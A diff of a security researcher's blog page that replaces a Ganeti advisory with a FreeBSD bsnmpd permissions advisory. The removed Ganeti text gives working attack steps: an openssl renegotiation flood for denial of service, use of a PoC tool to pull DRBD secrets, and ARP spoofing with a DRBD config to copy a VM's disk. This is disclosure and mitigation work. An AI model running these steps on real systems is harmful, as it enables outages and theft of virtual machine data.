@@ -36,407 +36,76 @@ h1, h2, h3, h4 {
 
     <div class="hero-unit faq">
         <div class="ac">
-            <h2><a href="2016-01-05-Ganeti-Info-Leak-DoS.html">CVE-2015-7944, CVE-2015-7945 - Ganeti Security Advisory (DoS, Unauthenticated Info Leak)</a></h2>
+            <h2><a href="2016-01-15-cve-2015-5677-freebsd-bsnmpd.html">CVE-2015-5677 - FreeBSD bsnmpd information disclosure</a></h2>
         </div>
     </div>
 
     <div>
         <h2>Product Description</h2>
-<p><a href="https://code.google.com/p/ganeti/">Ganeti</a> is a virtual machine cluster management tool developed by Google.</p>
-<p>The solution stack uses either Xen or KVM as the virtualization platform, LVM for disk management,
-and optionally DRBD for disk replication across physical hosts.</p>
+<p>The bsnmpd daemon serves the Internet SNMP (Simple Network Management
+Protocol).  It is intended to serve only the absolute basic MIBs and
+implement all other MIBs through loadable modules.</p>
 <h2>Vulnerabilities Summary</h2>
-<p>Ganeti has security problems in the default install (with DRBD) and the default configuration due to old libraries and design problem,
-even if the security level in Ganeti seems to be high.</p>
-<p>These problems affect every versions until the last released version.</p>
-<p>The Ganeti API Daemon is open on every interface by default and an attacker can DoS this daemon.</p>
-<p>It is also possible to abuse this deamon to retrieve information, such as network topology, DRBD secrets...</p>
-<p><strong>A PoC is provided to automaticaly retrieve sensitive information and a possible scenario, allowing to take over Virtual Machines remotely, is provided (which worked in my lab in certain conditions)</strong>.</p>
-<h2>Details - CVE-2015-7944 - Unauthenticated Remote DoS</h2>
-<p>Ganeti is prone to a SSL DoS with SSL renegociation against the RAPI Daemon:</p>
-<pre><code>user@kali:~$ (sleep 1; while true;do echo R;done) | openssl s_client -connect 10.105.1.200:5080
-CONNECTED(00000003)
-depth=0 CN = ganeti.example.com
-verify error:num=18:self signed certificate
-verify return:1
-depth=0 CN = ganeti.example.com
-verify return:1
----
-Certificate chain
- 0 s:/CN=ganeti.example.com
-   i:/CN=ganeti.example.com
----
-Server certificate
------BEGIN CERTIFICATE-----
+<p>By default, the bsnmpd configuration file in FreeBSD 9.3 and 10.x has weak permissions
+which allows a local user to retrieve sensitive information.</p>
+<h2>Details</h2>
+<p>By default the permissions of the bsnmpd configuration file are 0644 instead of 0600:</p>
+<pre><code>root@freebsd-test-snmp:~ # ls -latr /etc/snmpd.config
+-rw-r--r--  1 root  wheel  8662 Aug 12 16:27 /etc/snmpd.config
+root@freebsd-test-snmp:~ #
+</code></pre>
+<p>This file is readable by a local user and contains the credentials for read-only and
+read-write access (for SNMPv1, SNMPv2 and SNMPv3 protocols) and
+gives a local user unnecessary/dangerous access:</p>
+<pre><code>root@freebsd-test-snmp:~ # cat /etc/snmpd.config
 [...]
------END CERTIFICATE-----
-subject=/CN=ganeti.example.com
-issuer=/CN=ganeti.example.com
----
-No client certificate CA names sent
----
-SSL handshake has read 1003 bytes and written 625 bytes
----
-New, TLSv1/SSLv3, Cipher is AES256-GCM-SHA384
-Server public key is 2048 bit
-Secure Renegotiation IS supported
-Compression: NONE
-Expansion: NONE
-SSL-Session:
-    Protocol  : TLSv1.2
-    Cipher    : AES256-GCM-SHA384
-    Session-ID: D75BCF369143CD008D693B022B967149AF0BD420DE385C51227A1921CD29360D
-    Session-ID-ctx: 
-    Master-Key: 7DDD57FD479AE6555D1D42CF2B15B8857C28430189EC5C1331C75C4253E4A9F0FC0672EE2F2438CD055328C5A46C4F5F
-    Key-Arg   : None
-    PSK identity: None
-    PSK identity hint: None
-    SRP username: None
-    TLS session ticket lifetime hint: 300 (seconds)
-    TLS session ticket:
-    0000 - 10 ad 69 39 76 6c 2e 37-cf e7 c2 2c 5f f0 e0 20   ..i9vl.7...,_.. 
-    0010 - 5d 85 5a 79 82 20 6a 1d-f1 6e 51 f5 f2 f7 c6 cf   ].Zy. j..nQ.....
-    0020 - c1 85 2d 42 5a 1c 53 b4-cb db de 65 04 2a 02 da   ..-BZ.S....e.*..
-    0030 - 5c 7d 82 ef 56 4a a4 a1-88 bd 87 fd af 25 e3 2e   \}..VJ.......%..
-    0040 - 28 68 04 a4 01 22 88 72-30 0b 79 1c 75 61 88 d5   (h...".r0.y.ua..
-    0050 - c9 f3 e2 0b 02 50 bf c8-29 ac d9 36 f3 76 bd 8b   .....P..)..6.v..
-    0060 - 05 e0 d3 a9 f3 8b 8b 11-ef 19 2f 94 92 30 94 58   ........../..0.X
-    0070 - aa 64 ba 3f a4 fc 15 4b-74 11 3b c3 c7 e7 d4 33   .d.?...Kt.;....3
-    0080 - dd 76 e9 e1 1b 3a 95 c4-50 28 4f 9e bc cc cb f3   .v...:..P(O.....
-    0090 - bf 4d 60 92 64 00 af 67-c0 e9 69 e3 98 54 21 dc   .M`.d..g..i..T!.
 
-    Start Time: 1138121399
-    Timeout   : 300 (sec)
-    Verify return code: 18 (self signed certificate)
----
-RENEGOTIATING
-depth=0 CN = ganeti.example.com
-verify error:num=18:self signed certificate
-verify return:1
-depth=0 CN = ganeti.example.com
-verify return:1
-RENEGOTIATING
-depth=0 CN = ganeti.example.com
-verify error:num=18:self signed certificate
-verify return:1
-depth=0 CN = ganeti.example.com
-verify return:1
-RENEGOTIATING
-depth=0 CN = ganeti.example.com
-verify error:num=18:self signed certificate
-verify return:1
-depth=0 CN = ganeti.example.com
-verify return:1
-RENEGOTIATING
+# Change this!
+read := "public"
+# Uncomment begemotSnmpdCommunityString.0.2 below that sets the community
+# string to enable write access.
+write := "geheim"
+trap := "mytrap"
+
+[...]
+
+# SNMPv3 USM User definition
+#
+# [...]
+#
+#user1 := "bsnmp"
+#user1passwd := 0x22:0x98:0x1a:0x6e:0x39:0x93:0x16:0x5e:0x6a:0x21:0x1b:0xd8:0xa9:0x81:0x31:0x05:0x16:0x33:0x38:0x60
+
 [...]
 </code></pre>
-<p>From my test, 1 thread takes 75% of CPU.</p>
-<p><code>top</code> on the main server (10.105.1.200):</p>
-<pre><code>19734 gnt-rapi  20   0  148980  35364   4696 R  76.8  3.7   0:04.12 ganeti-rapi
-</code></pre>
-<p>Multiple threads will eat all the available CPUs and will likely DoS ganeti:</p>
-<pre><code>21280 gnt-rapi  20   0  148980  35364   4696 R  35.3  3.7   0:05.06 ganeti-rapi
-20968 gnt-rapi  20   0  148980  35364   4696 R  33.4  3.7   0:09.92 ganeti-rapi
-20969 gnt-rapi  20   0  148980  35364   4696 R  32.4  3.7   0:09.95 ganeti-rapi
-21282 gnt-rapi  20   0  148980  35364   4696 R  32.4  3.7   0:04.53 ganeti-rapi
-21281 gnt-rapi  20   0  148980  35364   4696 R  31.4  3.7   0:04.78 ganeti-rapi
-</code></pre>
-<p>An attacker can use tools from THC to perform SSL DoS too (openssl was the fastest solution out of the box): <a href="https://www.thc.org/thc-ssl-dos/">https://www.thc.org/thc-ssl-dos/</a>.</p>
-<h2>Details - CVE-2015-7945 - Unauthenticated Remote Information Disclosure</h2>
-<p>This vulnerability allows an attacker to retrieve data using information disclosure,
-allowing him, depending on the configuration, to remotely hack VMs.
-A PoC (<a href="https://pierrekim.github.io/advisories/GHETTO-BLASTER">GHETTO-BLASTER</a> which works in Linux (Debian, Kali) and FreeBSD) is available here: <a href="https://pierrekim.github.io/advisories/GHETTO-BLASTER">https://pierrekim.github.io/advisories/GHETTO-BLASTER</a>.</p>
-<p><strong>I. Design Security Problem with the RAPI Daemon</strong></p>
-<p>In the Ganeti master node, when using <code>/usr/sbin/gnt-network</code>, a non-root user can't get information (debian-01 is the ganeti master node):</p>
-<pre><code>user@debian-01:~$ /usr/sbin/gnt-network list
-It seems you don't have permissions to connect to the master daemon.
-Please retry as a different user.
-user@debian-01:~$
-</code></pre>
-<p>This is common for all <code>gnt-tools</code> and seems to be a security design.</p>
-<p>It appears Genati by default is too open when using the RAPI daemon and this daemon listens on every interface by default.</p>
-<p>For example, the network configuration can be extracted from jobs using the RAPI daemon without authentication.</p>
-<p>I wrote a tool, "GHETTO-BLASTER", to industrialize the process:</p>
-<pre><code>user@kali:~$ ./GHETTO-BLASTER http://&lt;ip_of_ganeti_rapi&gt;
-
-Example:
-  https://&lt;ip&gt;
-
-2015 Pierre Kim &lt;pierre.kim.sec@gmail.com&gt;
-     @PierreKimSec https://pierrekim.github.io
-DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE &lt;http://www.wtfpl.net/txt/copying/&gt;
-user@kali:~$ ./GHETTO-BLASTER http://10.105.1.200
-[...]
-[a lot of output]
-[...]
-user@kali:~$ ls -l 2-networks  2-networks-test-priv 2-networks-test-pub
--rw-r--r-- 1 user user 228 Jun 20 13:37 2-networks
--rw-r--r-- 1 user user 882 Jun 20 13:37 2-networks-test-priv
--rw-r--r-- 1 user user 881 Jun 20 13:37 2-networks-test-pub
-user@kali:~$ cat 2-networks  2-networks-test-priv 2-networks-test-pub
-$VAR1 = [
-          {
-            'name' =&gt; 'test-priv',
-            'uri' =&gt; '/2/networks/test-priv'
-          },
-          {
-            'uri' =&gt; '/2/networks/test-pub',
-            'name' =&gt; 'test-pub'
-          }
-        ];
-$VAR1 = {
-          'mtime' =&gt; '1313027652.67126',
-          'gateway' =&gt; undef,
-          'network6' =&gt; undef,
-          'inst_list' =&gt; [],
-          'mac_prefix' =&gt; undef,
-          'serial_no' =&gt; 1,
-          'free_count' =&gt; 254,
-          'name' =&gt; 'test-priv',
-          'map' =&gt; 'X..............................................................................................................................................................................................................................................................X',
-          'gateway6' =&gt; undef,
-          'external_reservations' =&gt; '192.168.1.0, 192.168.1.255',
-          'uuid' =&gt; '506ad97b-2276-43f4-ae27-e6bbb97f28ff',
-          'ctime' =&gt; '1133027652.67126',
-          'reserved_count' =&gt; 2,
-          'network' =&gt; '192.168.1.0/24',
-          'group_list' =&gt; [],
-          'tags' =&gt; []
-        };
-$VAR1 = {
-          'mac_prefix' =&gt; undef,
-          'inst_list' =&gt; [],
-          'network6' =&gt; undef,
-          'mtime' =&gt; '1333027641.64375',
-          'gateway' =&gt; undef,
-          'map' =&gt; 'X..............................................................................................................................................................................................................................................................X',
-          'free_count' =&gt; 254,
-          'name' =&gt; 'test-pub',
-          'serial_no' =&gt; 1,
-          'reserved_count' =&gt; 2,
-          'network' =&gt; '192.168.0.0/24',
-          'ctime' =&gt; '1133027641.64375',
-          'gateway6' =&gt; undef,
-          'uuid' =&gt; '48b34199-2d23-46f0-b4aa-2539cb4a7780',
-          'external_reservations' =&gt; '192.168.0.0, 192.168.0.255',
-          'group_list' =&gt; [],
-          'tags' =&gt; []
-        };
-user@kali:~$
-</code></pre>
-<p>It's possible to map the network and to retrieve sensible secrets.</p>
-<p>Other interesting information:</p>
-<p><code>osparams_secret</code> is readable in jobs using the access to RAPI.</p>
-<p><strong>II. Using this information disclosure to hack VMs</strong></p>
-<p>By default, <code>/var/lib/ganeti/config.data</code>(640, gnt-masterd:gnt-confd) contains the secret key for DRBD replication.</p>
-<p>A remote user or even a local non-root (or non gnt-masterd user) can't get the configuration of DRBD.</p>
-<p>This key can be extracted from jobs by abusing the RAPI daemon without authentication.</p>
-<p>After running GHETTO-BLASTER, you will have a lot of files:</p>
-<pre><code>user@kali:~$ ls
-1-list-collectors      2-jobs-121  2-jobs-154  2-jobs-187  2-jobs-219  2-jobs-251  2-jobs-284  2-jobs-47  2-jobs-8
-1-report-all           2-jobs-122  2-jobs-155  2-jobs-188  2-jobs-22   2-jobs-252  2-jobs-285  2-jobs-48  2-jobs-80
-2-features             2-jobs-123  2-jobs-156  2-jobs-189  2-jobs-220  2-jobs-253  2-jobs-286  2-jobs-49  2-jobs-81
-2-info                 2-jobs-124  2-jobs-157  2-jobs-19   2-jobs-221  2-jobs-254  2-jobs-287  2-jobs-5   2-jobs-82
-2-instances            2-jobs-125  2-jobs-158  2-jobs-190  2-jobs-222  2-jobs-255  2-jobs-288  2-jobs-50  2-jobs-83
-2-instances-vm-01      2-jobs-126  2-jobs-159  2-jobs-191  2-jobs-223  2-jobs-256  2-jobs-289  2-jobs-51  2-jobs-84
-2-instances-vm-01-jobs 2-jobs-127  2-jobs-16   2-jobs-192  2-jobs-224  2-jobs-257  2-jobs-29   2-jobs-52  2-jobs-85
-2-instances-vm-02      2-jobs-128  2-jobs-160  2-jobs-193  2-jobs-225  2-jobs-258  2-jobs-290  2-jobs-53  2-jobs-86
-2-instances-vm-02-jobs 2-jobs-129  2-jobs-161  2-jobs-194  2-jobs-226  2-jobs-259  2-jobs-291  2-jobs-54  2-jobs-87
-[...]
-2-jobs-109             2-jobs-141  2-jobs-174  2-jobs-206  2-jobs-239  2-jobs-271  2-jobs-34   2-jobs-67  2-networks
-2-jobs-11              2-jobs-142  2-jobs-175  2-jobs-207  2-jobs-24   2-jobs-272  2-jobs-35   2-jobs-68  2-nodes
-2-jobs-110             2-jobs-143  2-jobs-176  2-jobs-208  2-jobs-240  2-jobs-273  2-jobs-36   2-jobs-69  2-nodes-debian-01
-2-jobs-111             2-jobs-144  2-jobs-177  2-jobs-209  2-jobs-241  2-jobs-274  2-jobs-37   2-jobs-7   2-nodes-debian-01-role
-2-jobs-112             2-jobs-145  2-jobs-178  2-jobs-21   2-jobs-242  2-jobs-275  2-jobs-38   2-jobs-70  2-nodes-debian-02
-2-jobs-113             2-jobs-146  2-jobs-179  2-jobs-210  2-jobs-243  2-jobs-276  2-jobs-39   2-jobs-71  2-nodes-debian-02-role
-2-jobs-114             2-jobs-147  2-jobs-18   2-jobs-211  2-jobs-244  2-jobs-277  2-jobs-4    2-jobs-72  2-os
-2-jobs-115             2-jobs-148  2-jobs-180  2-jobs-212  2-jobs-245  2-jobs-278  2-jobs-40   2-jobs-73  version
-2-jobs-116             2-jobs-149  2-jobs-181  2-jobs-213  2-jobs-246  2-jobs-279  2-jobs-41   2-jobs-74
-2-jobs-117             2-jobs-15   2-jobs-182  2-jobs-214  2-jobs-247  2-jobs-28   2-jobs-42   2-jobs-75
-2-jobs-118             2-jobs-150  2-jobs-183  2-jobs-215  2-jobs-248  2-jobs-280  2-jobs-43   2-jobs-76
-2-jobs-119             2-jobs-151  2-jobs-184  2-jobs-216  2-jobs-249  2-jobs-281  2-jobs-44   2-jobs-77
-2-jobs-12              2-jobs-152  2-jobs-185  2-jobs-217  2-jobs-25   2-jobs-282  2-jobs-45   2-jobs-78
-2-jobs-120             2-jobs-153  2-jobs-186  2-jobs-218  2-jobs-250  2-jobs-283  2-jobs-46   2-jobs-79
-</code></pre>
-<p>Files contain DRBD secrets:</p>
-<pre><code>user@kali:~$ grep secret *|tail -n 5
-2-jobs-80:                                        'secret' =&gt; 'eb1fe92b20aef58ed0570df49a38f82cf5a72d06'
-2-jobs-82:                            'secret' =&gt; 'eb1fe92b20aef58ed0570df49a38f82cf5a72d06'
-2-jobs-84:                            'secret' =&gt; 'eb1fe92b20aef58ed0570df49a38f82cf5a72d06',
-2-jobs-85:                            'secret' =&gt; 'eb1fe92b20aef58ed0570df49a38f82cf5a72d06',
-2-jobs-86:                            'secret' =&gt; 'eb1fe92b20aef58ed0570df49a38f82cf5a72d06',
-user@kali:~$
-</code></pre>
-<p>The key is confirmed by using <code>drbdsetup show</code> as root in the Ganeti master node:</p>
-<pre><code>root@debian-01:~# drbdsetup show
-resource resource0 {
-    options {
-    }
-    net {
-        cram-hmac-alg           "md5";
-        shared-secret           "eb1fe92b20aef58ed0570df49a38f82cf5a72d06";
-        after-sb-0pri           discard-zero-changes;
-        after-sb-1pri           consensus;
-    }
-    _remote_host {
-        address                 ipv4 10.105.1.201:11000;
-    }
-    _this_host {
-        address                 ipv4 10.105.1.200:11000;
-        volume 0 {
-            device                      minor 0;
-            disk                        "/dev/xenvg-vg/41975138-516e-4f8d-9c39-f6716a89efa2.disk0_data";
-            meta-disk                   "/dev/xenvg-vg/41975138-516e-4f8d-9c39-f6716a89efa2.disk0_meta";
-            disk {
-                size                    8388608s; # bytes
-                resync-rate             61440k; # bytes/second
-            }
-       }
-    }
-}
-root@debian-01:~#
-</code></pre>
-<p>By digging more, one of the jobs file (2-jobs-280) contains the DRDB configuration:</p>
-<pre><code>[...]
-  'drbd_info' =&gt; {
-                   'port' =&gt; 11000,
-                   'primary_minor' =&gt; 0,
-                   'secondary_node' =&gt; 'debian-02',
-                   'secondary_minor' =&gt; 0,
-                   'secret' =&gt; 'eb1fe92b20aef58ed0570df49a38f82cf5a72d06',
-                   'primary_node' =&gt; 'debian-01'
-                 },
-[...]
-</code></pre>
-<p>As stated in <a href="http://docs.ganeti.org/ganeti/current/html/security.html">http://docs.ganeti.org/ganeti/current/html/security.html</a>:</p>
-<pre><code>DRBD connections are protected from erroneous connections to other machines (as may happen due
-to software issues), and from accepting connections from other machines, by using a shared secret,
-exchanged via RPC requests from the master to the nodes when configuring the device.
-</code></pre>
-<p>We recovered the secret of DRBD, the port used and the nodes without authentication.
-Other files contain the LVM VG and the LVM LG names! It's enough to start playing with DRDB from an attacker side.</p>
-<p><strong>III. DRBD Madness</strong></p>
-<p>Now, it's time for DRBD Feng Shui!</p>
-<p>Getting the File System of a VM:</p>
-<p>o By doing ARP spoofing in the same LAN:</p>
-<p>We will impersonate 10.105.1.201 by doing ARP poisoning and using a valid drbd.conf thank to the parameters provided by the RAPI daemon:</p>
-<pre><code>root@kali# cat etc-drbd.conf
-
-include "drbd.d/global_common.conf";
-include "drbd.d/*.res";
-
-resource resource0 {
-    volume 0 {
-       device minor 0;
-       disk                        "/dev/xenvg-vg/41975138-516e-4f8d-9c39-f6716a89efa2.disk0_data";
-       meta-disk                   "/dev/xenvg-vg/41975138-516e-4f8d-9c39-f6716a89efa2.disk0_meta";
-    }
-    protocol C;
-    net {
-        cram-hmac-alg           "md5";
-        shared-secret           "eb1fe92b20aef58ed0570df49a38f82cf5a72d06";
-        after-sb-0pri           discard-zero-changes;
-        after-sb-1pri           consensus;
-    }
-    on target {
-        address    10.105.1.200:11000;
-    }
-    on kali {
-        address    10.105.1.201:11000;
-    }
-}
-
-
-root@kali# vgremove xenvg-vg 2&gt;/dev/null
-root@kali# dd if=/dev/zero of=/dev/sdb bs=1024 count=1024
-root@kali# pvcreate /dev/sdb
-root@kali# vgcreate xenvg-vg /dev/sdb
-root@kali# lvcreate --name 41975138-516e-4f8d-9c39-f6716a89efa2.disk0_data --size 4G xenvg-vg
-root@kali# lvcreate --name 41975138-516e-4f8d-9c39-f6716a89efa2.disk0_meta --size 128M xenvg-vg
-root@kali# cp etc-drbd.conf /etc/drbd.conf
-root@kali# drbdadm create-md resource0
-root@kali# drbdadm up resource0
-
-&lt;ARP poisoning&gt; || root@kali# ifconfig eth0 10.105.1.201 netmask 255.255.255.0
-
-root@kali# drbdadm attach resource0
-root@kali# drbdadm connect resource0
-root@kali# cat /proc/drbd
-version: 8.4.3 (api:1/proto:86-101)
-srcversion: 1A9F77B1CA5FF92235C2213 
- 0: cs:SyncTarget ro:Secondary/Primary ds:Inconsistent/UpToDate C r-----
-    ns:0 nr:916568 dw:916472 dr:0 al:0 bm:55 lo:2 pe:0 ua:2 ap:0 ep:1 wo:f oos:3277832
-        [===&gt;................] sync'ed: 22.0% (3277832/4194304)K
-        finish: 0:08:33 speed: 6,368 (5,912) want: 4,520 K/sec
-root@kali# echo "wow synchronisation in progress !"
-wow synchronisation in progress !
-root@kali#
-</code></pre>
-<p>After 10min of synchronisation, an attacker will have a perfect copy of the targeted VM File System using DRDB replication.</p>
-<p>It's also possible to write information in the File System (like adding SSH keys).
-Rooting VMs by adding ssh keys and by doing <code>s/PermitRootLogin No/PermitRootLogin Yes/</code> is left as a exercise to the reader.</p>
-<p>o Other methods of MiTM exist and are left as a exercise for the reader.</p>
-<h2>Proposed Workarounds by the Security Researcher</h2>
-<p>At first, I think these steps must be done to improve the security of ganeti:</p>
-<p>1/ Forcing the RAPI to listen to 127.0.0.1 instead of 0.0.0.0.</p>
-<p>This can be done by adding by default to /etc/default/ganeti:</p>
-<pre><code>RAPI_ARGS="-b 127.0.0.1"
-</code></pre>
-<p>Listening to 127.0.0.1 for ganeti-mond is a good step too (it listens to 0.0.0.0:1815/tcp)</p>
-<p>2/ Adding an authentication by default for the RAPI daemon (not only for writing access but for reading access too)</p>
-<p>3/ Filtering the output of the jobs to avoid leaking secrets.</p>
-<p>Note that the immediate step is to change the secrets used for DRBD and
-  to be sure nobody had access to the DRBD blocks, allowing a compromise of all the VMs.</p>
-<p>4/ Disabling SSL renegociation and updating the default ciphers.</p>
-<p>A personal note: as deploying a working Ganeti platform is very complicated,
-attackers will likely giving up before having a working Ganeti platform to study :)</p>
 <h2>Vendor Response</h2>
-<p>Update to the latest version of Ganeti.</p>
-<p>Read details about mitigation measures here: <a href="https://groups.google.com/forum/#!topic/ganeti/9bLyzwmmvdg">https://groups.google.com/forum/#!topic/ganeti/9bLyzwmmvdg</a></p>
+<p>The official patch does not fix the permissions for existing installations.</p>
+<p>This vulnerability can be fixed by modifying the permission on
+/etc/bsnmpd.conf to owner root:wheel and permission 0600.</p>
 <h2>Report Timeline</h2>
 <ul>
-<li>Jul 30, 2015 : Pierre Kim sends an email to security@ganeti.org asking for a GPG key, email bounced</li>
-<li>Jul 30, 2015 : Pierre Kim asks Google Security Team if Ganeti is elligible to the Google Vulnerability Reward Program</li>
-<li>Jul 30, 2015 : Pierre Kim sends an email to Ganeti Team for a working security contact</li>
-<li>Jul 30, 2015 : Guido Trotter replies by saying to use opensource-ganeti at google.com</li>
-<li>Aug 1, 2015: Security@google.com confirms it's out of scope</li>
-<li>Aug 4, 2015: Pierre Kim says the exploits are critical and Ganeti is widely used by Google</li>
-<li>Aug 11, 2015: Advisories and PoC sent to Google Security Team and Pierre Kim asks Google Security Team to contact Riseup, as they are using Ganeti</li>
-<li>Aug 12, 2015: Google Security Team transmitted the information to Ganeti Team</li>
-<li>Aug 20, 2015: Google Security Team is working on the scope and the impact of the report</li>
-<li>Aug 27, 2015: Google Security Team decided is not within scope of the VRP program but a research grant is awarded as "Security improvement efficacy research"</li>
-<li>Aug 28, 2015: Pierre Kims provides information about DRBDv8, DRBDv9. Pierre Kim asks information about the DoS, the condition for the rewards and asks if Riseup was contacted</li>
-<li>Sep 10, 2015: Google Security Team confirms they will not contact Riseup and that they ask "that you act and communicate in good faith, use your own best judgement, and we'll do everything we can to work with you to resolve vulnerabilities in a reasonable timeframe"</li>
-<li>Oct 6, 2015: Pierre Kim asks for update about the security patchs and informs he will contact Riseup</li>
-<li>Oct 6, 2015: Riseup is contacted</li>
-<li>Oct 16, 2015: Google Security Team confirm releases end of October and asks about CVEs from MITRE. The Ganeti Bug #1135 is created</li>
-<li>Oct 17, 2015: Pierre Kim asks Google to ask MITRE CVE assignments and proposes to contact CNNVD to get a CNNVD entry</li>
-<li>Oct 17, 2015: Google Security Team contacted MITRE to get CVEs</li>
-<li>Oct 23, 2015: Google Security Team has 2 CVE: CVE-2015-7944 and CVE-2015-7945</li>
-<li>Nov 3, 2015: Pierre Kim informs new security with a DoS with the jobs creation</li>
-<li>Nov 5, 2015: Ganeti Team has rate-limit to 20 concurrent jobs creation, which limit the problems and declares the patch will be very soon</li>
-<li>Nov 17, 2015: Ganeti Team announces new releases next week</li>
-<li>Nov 23, 2015: a pre-advisory is sent to Ganeti Team and Google Security Team</li>
-<li>Dec 30, 2015: Ganeti Team releases a security advisory</li>
-<li>Jan 05, 2015: A public advisory is sent to security mailing lists</li>
+<li>Nov 04, 2015: Vulnerability found by Pierre Kim.</li>
+<li>Nov 05, 2015: security-officer@freebsd.org is notified of the vulnerability.</li>
+<li>Nov 07, 2015: security-officer@freebsd.org confirms the vulnerability but the patch in existing installations does not seem to be feasible.</li>
+<li>Nov 11, 2015: Pierre Kim asks security-officer@freebsd.org for a CVE number, using FreeBSD CVE pool for future FreeBSD vulnerabilities.</li>
+<li>Nov 11, 2015: security-officer@freebsd.org assigns CVE-2015-5677.</li>
+<li>Jan 05, 2016: Pierre Kim asks the status of the vulnerability.</li>
+<li>Jan 13, 2016: Pierre Kim states he will release a security advisory the Feb 05, 2016 after a 3-month embargo.</li>
+<li>Jan 13, 2016: security-officer@freebsd.org confirms a security advisory will be issued on Jan 19, 2016.</li>
+<li>Jan 14, 2016: An official advisory is published by FreeBSD.</li>
+<li>Jan 15, 2016: A public advisory is sent to security mailing lists.</li>
 </ul>
 <h2>Credit</h2>
-<p>These vulnerabilities were found by Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>).</p>
-<h2>Greetings</h2>
-<p>Big thanks to my friends Alexandre Torres, Jordan, Jerome and Stephen.</p>
-<p>Thanks to Google Security Team which coordinated the issues by contacting MITRE and the different parties.</p>
+<p>This vulnerability was found by Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>).</p>
 <h2>References</h2>
-<p><a href="https://pierrekim.github.io/advisories/2016-ganeti-0x00.txt">https://pierrekim.github.io/advisories/2016-ganeti-0x00.txt</a></p>
-<p><a href="https://pierrekim.github.io/blog/2016-01-05-Ganeti-Info-Leak-DoS.html">https://pierrekim.github.io/blog/2016-01-05-Ganeti-Info-Leak-DoS.html</a></p>
-<p><a href="http://www.ocert.org/advisories/ocert-2015-012.html">http://www.ocert.org/advisories/ocert-2015-012.html</a></p>
-<p><a href="https://groups.google.com/forum/#!topic/ganeti/9bLyzwmmvdg">https://groups.google.com/forum/#!topic/ganeti/9bLyzwmmvdg</a></p>
-<h2>PoC - GHETTO-BLASTER</h2>
-<p>PoC is available here: <a href="https://pierrekim.github.io/advisories/GHETTO-BLASTER">https://pierrekim.github.io/advisories/GHETTO-BLASTER</a>.</p>
+<p><a href="https://pierrekim.github.io/advisories/CVE-2015-5677-freebsd-bsnmpd.txt">https://pierrekim.github.io/advisories/CVE-2015-5677-freebsd-bsnmpd.txt</a></p>
+<p><a href="https://pierrekim.github.io/blog/2016-01-15-cve-2015-5677-freebsd-bsnmpd.html">https://pierrekim.github.io/blog/2016-01-15-cve-2015-5677-freebsd-bsnmpd.html</a></p>
+<p><a href="https://www.freebsd.org/security/advisories/FreeBSD-SA-16:06.bsnmpd.asc">https://www.freebsd.org/security/advisories/FreeBSD-SA-16:06.bsnmpd.asc</a></p>
 <h2>Disclaimer</h2>
 <p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
 Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a></p>
         <div>
-            <p class="text-muted">published on 2016-01-05 00:00:00 by Pierre Kim &lt;pierre.kim.sec@gmail.com&gt;</p>
+            <p class="text-muted">published on 2016-01-15 00:00:00 by Pierre Kim &lt;pierre.kim.sec@gmail.com&gt;</p>
         </div>
     </div>
 
@@ -453,6 +122,11 @@ Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3
         </tr>
     </thead>
     <tbody>
+    
+        <tr>
+            <td>2016-01-05 00:00:00</td>
+            <td><a href="2016-01-05-Ganeti-Info-Leak-DoS.html">CVE-2015-7944, CVE-2015-7945 - Ganeti Security Advisory (DoS, Unauthenticated Info Leak)</a></td>
+        </tr>
     
         <tr>
             <td>2015-12-01 00:00:00</td>
